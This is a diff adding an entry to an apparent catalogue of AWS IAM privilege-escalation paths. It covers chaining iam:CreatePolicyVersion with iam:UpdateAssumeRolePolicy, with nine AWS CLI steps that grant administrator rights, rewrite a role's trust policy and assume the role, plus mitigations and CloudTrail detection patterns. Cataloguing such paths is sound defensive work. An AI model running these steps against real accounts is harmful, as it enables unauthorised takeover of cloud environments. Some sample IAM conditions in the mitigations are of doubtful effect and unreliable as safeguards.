@@ -1,0 +1,214 @@
+id: "iam-020"
+name: "iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy"
+category: "lateral-movement"
+services:
+  - iam
+
+permissions:
+  required:
+    - permission: "iam:CreatePolicyVersion"
+      resourceConstraints: "Must have access to create policy versions on a customer-managed policy attached to the target role"
+    - permission: "iam:UpdateAssumeRolePolicy"
+      resourceConstraints: "Must have permission to update the trust policy of the target role"
+  additional:
+    - permission: "iam:GetPolicy"
+      resourceConstraints: "Helpful for retrieving policy details and ARNs"
+    - permission: "iam:GetPolicyVersion"
+      resourceConstraints: "Useful for viewing current policy version contents"
+    - permission: "iam:ListPolicyVersions"
+      resourceConstraints: "Helpful for viewing all versions of a policy"
+    - permission: "iam:ListRoles"
+      resourceConstraints: "Helpful for discovering available roles to target"
+    - permission: "iam:GetRole"
+      resourceConstraints: "Useful for viewing role trust policies and attached policies"
+
+description: This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed policy that is attached to a different role (not your own principal). In this scenario, you cannot directly escalate your own privileges by modifying the policy, but you can escalate by modifying the policy attached to the target role and then assuming that role. This requires both `iam:CreatePolicyVersion` on the customer-managed policy AND `iam:UpdateAssumeRolePolicy` on the target role. You create a new policy version with administrative permissions (which automatically becomes the default), update the target role's trust policy to allow your principal to assume it, then assume the role to gain the elevated privileges. Critically, you do not need `sts:AssumeRole` permission beforehand - when a principal is explicitly named in a role's trust policy, AWS allows that principal to assume the role regardless of whether they have separate `sts:AssumeRole` permission.
+
+prerequisites:
+  admin:
+    - "A customer-managed IAM policy must exist that is attached to a target role"
+    - "You must have `iam:CreatePolicyVersion` permission on that customer-managed policy"
+    - "You must have `iam:UpdateAssumeRolePolicy` permission on the target role"
+    - "The target role must have a customer-managed policy attached (not just AWS-managed policies, which cannot be modified)"
+  lateral:
+    - "A customer-managed IAM policy must exist that is attached to a target role"
+    - "You must have `iam:CreatePolicyVersion` permission on that customer-managed policy"
+    - "You must have `iam:UpdateAssumeRolePolicy` permission on the target role"
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        # Set variables for the target policy and role
+        POLICY_ARN="arn:aws:iam::ACCOUNT_ID:policy/target-policy-name"
+        TARGET_ROLE="target-role-name"
+        ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+        STARTING_PRINCIPAL_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
+      description: "Define the target policy ARN, role name, and retrieve your principal ARN for the trust policy update"
+    - step: 2
+      command: |
+        # Create admin_policy.json with administrative permissions
+        cat > admin_policy.json << 'EOF'
+        {
+          "Version": "2012-10-17",
+          "Statement": [
+            {
+              "Effect": "Allow",
+              "Action": "*",
+              "Resource": "*"
+            }
+          ]
+        }
+        EOF
+      description: "Create a policy document with full administrative permissions"
+    - step: 3
+      command: |
+        # Create a new policy version with admin permissions and set as default
+        aws iam create-policy-version \
+          --policy-arn $POLICY_ARN \
+          --policy-document file://admin_policy.json \
+          --set-as-default
+      description: "Create a new policy version with administrative permissions. The --set-as-default flag makes this version active immediately, affecting all principals with this policy attached (including the target role)"
+    - step: 4
+      command: |
+        # Wait for policy changes to propagate
+        sleep 15
+      description: "Wait for the IAM policy changes to propagate across AWS infrastructure (typically takes 10-15 seconds)"
+    - step: 5
+      command: |
+        # Create a new trust policy that allows your principal to assume the role
+        cat > trust_policy.json << EOF
+        {
+          "Version": "2012-10-17",
+          "Statement": [
+            {
+              "Effect": "Allow",
+              "Principal": {
+                "AWS": "$STARTING_PRINCIPAL_ARN"
+              },
+              "Action": "sts:AssumeRole"
+            }
+          ]
+        }
+        EOF
+      description: "Create a trust policy that explicitly allows your principal to assume the target role"
+    - step: 6
+      command: |
+        # Update the role's trust policy
+        aws iam update-assume-role-policy \
+          --role-name $TARGET_ROLE \
+          --policy-document file://trust_policy.json
+      description: "Update the target role's trust policy to allow your principal to assume it"
+    - step: 7
+      command: |
+        # Wait for trust policy changes to propagate
+        sleep 15
+      description: "Wait for the trust policy changes to propagate"
+    - step: 8
+      command: |
+        # Assume the target role (no prior sts:AssumeRole permission needed)
+        CREDENTIALS=$(aws sts assume-role \
+          --role-arn "arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE" \
+          --role-session-name privesc-session \
+          --query 'Credentials' \
+          --output json)
+
+        # Export the temporary credentials
+        export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
+        export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
+        export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
+      description: "Assume the target role to obtain temporary credentials with administrative permissions. Note that you do not need prior sts:AssumeRole permission - being explicitly named in the trust policy is sufficient"
+    - step: 9
+      command: |
+        # Verify administrative access
+        aws iam list-users --max-items 5
+      description: "Verify that you now have administrative access by listing IAM users"
+
+limitations: |
+  This attack requires a customer-managed policy that is attached to a role. AWS-managed policies cannot be modified (no versions can be created), so this attack only works with customer-managed policies.
+
+  Additionally, the starting principal must have both permissions (`iam:CreatePolicyVersion` on the customer-managed policy AND `iam:UpdateAssumeRolePolicy` on the target role). If these permissions are scoped to different policies or roles, the attack path may not be viable.
+
+  The attack provides administrative access when you create a policy version with admin permissions. However, you could create a policy with any permissions, so the level of access depends on what you include in the new policy version.
+
+recommendation: |
+  Restrict `iam:CreatePolicyVersion` and `iam:UpdateAssumeRolePolicy` using the principle of least privilege. These permissions are highly sensitive and should rarely be granted together.
+
+  **Prevention strategies:**
+
+  1. Limit `iam:CreatePolicyVersion` to only administrative users who need to manage policies:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:CreatePolicyVersion",
+    "Resource": "arn:aws:iam::ACCOUNT:policy/SpecificPolicy",
+    "Condition": {
+      "StringEquals": {
+        "aws:RequestedRegion": "us-east-1"
+      }
+    }
+  }
+  ```
+
+  2. Restrict `iam:UpdateAssumeRolePolicy` to prevent unauthorized trust policy modifications:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:UpdateAssumeRolePolicy",
+    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
+    "Condition": {
+      "StringNotLike": {
+        "iam:PolicyDocument": "*arn:aws:iam::*:role/*"
+      }
+    }
+  }
+  ```
+
+  3. Use Service Control Policies (SCPs) to prevent modification of critical policies and trust relationships across the organization
+
+  4. Implement IAM permissions boundaries to limit the maximum permissions a role can have
+
+  5. Separate the permissions - avoid granting both `iam:CreatePolicyVersion` and `iam:UpdateAssumeRolePolicy` to the same principal
+
+  6. Require MFA for policy version creation and trust policy modification operations
+
+  7. Consider using AWS IAM Access Analyzer to continuously monitor trust policies for unexpected principals
+
+  **Detection strategies:**
+
+  Monitor CloudTrail for the following event patterns:
+  - `CreatePolicyVersion` API calls, especially with the `--set-as-default` flag
+  - `UpdateAssumeRolePolicy` API calls that add new principals to trust policies
+  - Sequential occurrences of `CreatePolicyVersion` followed by `UpdateAssumeRolePolicy` within a short time window
+  - `AssumeRole` events that follow policy or trust policy modification events
+  - Creation of policy versions that grant overly broad permissions (e.g., `Action: "*"` or administrative managed policies)
+
+  Set up CloudWatch alarms for unexpected changes to customer-managed policies and role trust policies. Investigate any modifications that broaden trust relationships or elevate permissions.
+
+discoveredBy:
+  name: "Spencer Gietzen"
+  organization: "Rhino Security Labs"
+  date: "2018"
+
+references:
+  - title: "AWS IAM Privilege Escalation Methods"
+    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+  - title: "Hacking The Cloud - IAM Privilege Escalation"
+    url: "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+
+relatedPaths:
+  - "iam-001"
+  - "iam-002"
+  - "iam-009"
+  - "iam-014"
+
+detectionRules:
+  - platform: "CloudSIEM"
+    ruleId: "TBD"
+    url: "https://docs.datadoghq.com/security/default_rules/"
+
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
+  pacu: false
+  prowler: false
